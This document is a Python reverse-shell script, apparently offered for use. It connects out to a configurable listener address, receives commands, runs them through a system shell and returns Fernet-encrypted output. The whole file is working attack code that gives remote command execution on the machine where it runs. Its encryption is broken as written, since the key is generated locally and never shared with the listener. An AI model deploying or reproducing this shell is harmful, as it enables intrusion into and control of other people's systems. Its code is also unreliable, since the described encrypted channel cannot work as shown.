#!/usr/bin/env python3
# Python3 Encrypted Advanced Reverse Shell
# Configure LHOST and LPORT before use

import socket
import subprocess
import base64
import os
from cryptography.fernet import Fernet

LHOST = '192.168.1.100'
LPORT = 4450

key = Fernet.generate_key()
cipher = Fernet(key)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LHOST, LPORT))

while True:
    encrypted_command = s.recv(1024)
    if not encrypted_command:
        break

    try:
        command = cipher.decrypt(encrypted_command).decode()
        if command.strip() == 'exit':
            break

        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        encrypted_output = cipher.encrypt(output)
        s.send(encrypted_output)
    except Exception as e:
        error_msg = str(e).encode()
        encrypted_error = cipher.encrypt(error_msg)
        s.send(encrypted_error)

s.close()
